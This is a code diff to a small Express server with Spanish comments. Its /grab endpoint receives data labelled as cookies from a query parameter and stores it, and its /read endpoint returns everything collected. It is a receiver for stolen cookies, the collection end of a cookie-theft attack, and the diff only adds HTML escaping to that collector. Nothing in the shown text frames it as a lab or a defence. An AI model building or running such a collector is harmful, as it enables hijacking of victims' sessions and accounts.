@@ -1,6 +1,7 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors'); // Importar cors
+const escape = require('escape-html');
 
 const app = express();
 let cookiesAlmacenadas = ""; // Variable para almacenar las cookies
@@ -14,12 +15,12 @@ app.get('/', (req, res) => {
 
 app.get('/grab', (req, res) => {
     const data = req.query.data;  // Obtener las cookies
-    cookiesAlmacenadas += " " + data; // Almacenar las cookies
-    res.send(data);
+    cookiesAlmacenadas += " " + escape(data); // Almacenar las cookies
+    res.send(escape(data));
 });
 
 app.get('/read', (req, res) => {
-    res.send(cookiesAlmacenadas); // Enviar las cookies almacenadas
+    res.send(escape(cookiesAlmacenadas)); // Enviar las cookies almacenadas
 });
 
 app.get('/cookies', (req, res) => {
